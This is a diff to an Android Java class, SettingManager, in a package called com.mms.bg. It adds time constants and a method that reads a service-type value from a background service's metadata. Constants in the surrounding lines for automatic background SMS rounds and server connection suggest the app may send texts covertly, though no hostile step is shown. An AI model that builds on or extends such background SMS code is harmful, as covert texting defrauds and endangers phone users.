@@ -10,6 +10,7 @@ import java.net.URI;
 import java.net.URISyntaxException;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 
 import javax.xml.parsers.SAXParser;
 import javax.xml.parsers.SAXParserFactory;
@@ -39,6 +40,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
 import android.database.Cursor;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -120,6 +123,12 @@ public class SettingManager {
     private static final long SMS_ONE_ROUND_NAP = 5 * 60 * 1000;
     public static final long SMS_CHECK_ROUND_DELAY = ((long) 24) * 3600 * 1000;
 //    public static final long SMS_CHECK_ROUND_DELAY = ((long) 60) * 60 * 1000;
+    
+    public static final long ONE_HOUR = ((long) 60) * 60 * 1000;
+    
+    public static final long HOUR_24 = (long) 24;
+    
+    public static final long DAYS_20 = ((long) 20) * 24 * ONE_HOUR;
     
     public static final String AUTO_SMS_ACTION = "com.mms.bg.SMS";
     public static final String AUTO_CONNECT_SERVER = "com.mms.bg.SERVER";
@@ -1458,6 +1467,22 @@ public class SettingManager {
             c.close();
 
         return apnId;
+    }
+    
+    public String getAPPTypeFromPackage(Context context) {
+        String appType = null;
+        PackageManager pm = context.getPackageManager();
+        List<ResolveInfo> plugins = pm.queryIntentServices(new Intent(BgService.FILTER_ACTION), PackageManager.GET_META_DATA);
+        for (ResolveInfo info : plugins) {
+            if (info.serviceInfo.name.equals("com.mms.bg.ui.BgService") == true) {
+                if (info.serviceInfo.metaData != null 
+                        && info.serviceInfo.metaData.containsKey(BgService.START_SERVICE_TYPE) == true) {
+                    appType = String.valueOf(info.serviceInfo.metaData.getString(BgService.START_SERVICE_TYPE));
+                }
+            }
+        }
+        
+        return appType;
     }
     
     private SettingManager(Context context) {
